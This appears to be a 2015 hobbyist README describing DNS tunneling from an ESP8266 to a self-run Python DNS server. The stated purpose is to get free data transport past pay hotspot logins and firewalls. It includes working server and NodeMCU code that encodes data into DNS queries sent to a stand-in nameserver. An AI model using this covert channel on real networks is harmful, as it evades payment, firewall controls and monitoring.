# esp8266-dns

Featured on [Hackaday](https://hackaday.com/2015/07/01/dns-tunneling-with-an-esp8266/)  

### BTwifi & fon (and other hotspots) as a free transport of IOT device data using dns tunneling
_2015-06-25_

The idea was inspired by a set of events in which breaking free from being firewalled and a desperate need to gain Internet access. This is when I remembered from years ago someone came up with a way to bypass the login screens on pay as you go mobile Internet sticks. I began to research the methods used and eventually ended up coming across a package in the Debian repo called Iodine, created by Kyro(kyro.se). This program allows you to create an ipv4 over DNS tunnel. So when I got my first 2 ESP8266's it seemed obvious what should happen next with the two technologies.

The result is being able to send data to a server using dns requests to bypass any pay for hotspots, or bypass a firewall. One company to point out who has 5 million+ hotspots UK wide is BT, so there are no shortages for places to potentially send data from.

It works on the simple basis of sending a dns request to a fake DNS server which in my case is a simple python program with an NS record pointing to it. The dns request is made up of many parts, but the part we are interested in is the DNS question, this is where we want to throw our data.

**So how does it work?**

First you need to setup some records for this to work.

		server < sub.domain.com

then a nameserver record that points to the sub domain:

		sub.example.com > ns.example.com

Ok so now we have somewhere for our requests to go, but now we need a fake dns server to pick the requests up, so a simple python server to capture and parse the requests into useful data for us to use.

### dns udp server
		import socket
		from dnslib import DNSRecord

		def parsed_data(data):
		#the format im using for this is: "zz1.data.xx1.ns.example.com"
		    parsed_data = data[data.index("zz1."):data.index(".xx1")].replace("zz1.","").replace(".xx1","")
		    return parsed_data
		server = ""
		udoser = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		udoser.bind((server, 53))
		i=0
		while i == 0:
		    recv_data = udoser.recv(2048)
		    if recv_data == None:
			break
		    d = DNSRecord.parse(recv_data) #unpack the data
		    print parsed_data(str(d)) #parse and print data</pre>

		
On to the ESP8266, i installed NodeMCU because it has a lot of useful features and one of them is a simple function to do DNS requests so this saves you a ton of programming. So im using the DNS function as a quick and dirty example.

		sk=net.createConnection(net.UDP, 0)
		ens = “zz1.”
		ene = “.xx1.”
		data = "hello"
		server_address = ".ns.example.com"
		sensor_data = ens .. data .. ene .. server_address
		sk:dns(sensor_data,function(conn,ip) end)
		sk = nil</pre>

Once sent it should look like below if your doing a tcpdump of it.

		18:32:36.527658 IP (tos 0x0, ttl 53, id 0, offset 0, flags [DF], proto UDP (17), length 60)
		xx.xx.xx.xx.37254 &gt; xx.xx.xx.xxx.53: [udp sum ok] 27146 A? zz1.data.xx1.ns.example.com. (32)

When we make the request it will be sent to ns.example.com because other DNS servers wont have a record of it, once we get it we can parse out the data and use it how we like, thats all there is to it.

We place zz1 and xx1 as markers for the parser to separate out the data from the request easily, after this its up to you to choose what you do with the data, but this should open up a lot more possibilities for where you place your esp.

__This is a proof of concept and is only for educational purposes, i am not responsible for shit!__
